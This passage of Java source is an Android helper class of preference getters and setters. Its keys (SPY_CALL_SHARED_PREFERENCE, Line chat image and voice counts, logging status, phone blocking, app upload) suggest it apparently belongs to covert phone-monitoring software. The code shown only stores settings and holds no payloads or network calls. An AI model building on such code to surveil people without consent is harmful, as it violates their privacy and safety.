		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_APK_NUMBER,0);
	}
	
	
	public static void setApkIconIndexNumber(Context context,int apk_index_number)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_APK_NUMBER, apk_index_number).commit();
	}

	public static int getApkIconIndexNumber(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_APK_NUMBER,0);
	}
	//Linechat image preference

	/**************************/
	public static void saveLineChatImage_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_LINE_IMAGE_PRE_COUNT, Precount).commit();
	}

	public static int getsaveLineChatImage_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_LINE_IMAGE_PRE_COUNT,0);
	}
	public static void saveLineChatVoice_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_LINE_CHAT_VOICE_COUNT, Precount).commit();
	}

	public static int getsaveLineChatVoice_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_LINE_CHAT_VOICE_COUNT,0);
	}
	/************Loggin on/off**************/
	public static void saveLoggingStatus(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(LOGGING_STATUS, loggingStatus).commit();
	}

	public static String getLoggingStatus(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(LOGGING_STATUS,"");
	}
	
	//********************BLock Screen
	/**
	 *  Time Restriction Phone Blocked 
	 */

	public static void saveTimeRestrictPhoneBlockedStatus(Context context,int phoneBlockStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(TIME_RESTRICTION_PHONE_BLOCKED_STATUS,phoneBlockStatus).commit();
	}

	public static int getTimeRestrictPhoneBlockedStatus(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(TIME_RESTRICTION_PHONE_BLOCKED_STATUS,0);
	}
	//*******************
	
	
	
	/**************************/
	public static void saveCOUNT_GROUP_ID(Context context,int COUNT_GroupID)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_COUNT_GROUP_ID, COUNT_GroupID).commit();
	}

	public static int getsaveCOUNT_GROUP_ID(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_COUNT_GROUP_ID,0);
	}
	public static void saveCOUNT_VOICEGROUP_ID(Context context,int COUNT_Voice_GroupID)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_COUNT_VOICEGROUP_ID, COUNT_Voice_GroupID).commit();
	}

	public static int getCOUNT_VOICEGROUP_ID(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_COUNT_VOICEGROUP_ID,0);
	}
    public static boolean getEnableFK(Context context) {
	  	return PreferenceManager.getDefaultSharedPreferences(context)
	  		.getBoolean(OPT_FKON, OPT_FKON_DEF);
	  }
	 public static int getNoOfFiles(Context context) {
		    return validPositiveIntegerOrNumber(PreferenceManager.getDefaultSharedPreferences(context)
		      	.getString(OPT_FILENO, OPT_FILENO_DEF), 0);
			}
	 /**
	   * convert a Sting to a int >= 0 all negative and invalid numbers are treated as zero
	   * @param strVal
	   * @return
	   */
	  private static int validPositiveIntegerOrNumber(String strVal, int number) {
			if (strVal.trim().equals(""))
				strVal = "" + number;
			Integer i = number;
			try {
				i = new Integer(strVal).intValue();
				if (i<0)
					i = 0;
			} catch (Exception e) {
				
			}
	  	return i.intValue();
	  }
	
	  // AppUploadName
		public static void saveAppUploadName(Context context,String loggingStatus)
		{
			SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
			sp.edit().putString(APP_UPLOAD, loggingStatus).commit();
		}

		public static String getAppUploadName(Context context)
		{
			SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
			return sp.getString(APP_UPLOAD,"");
		}
}
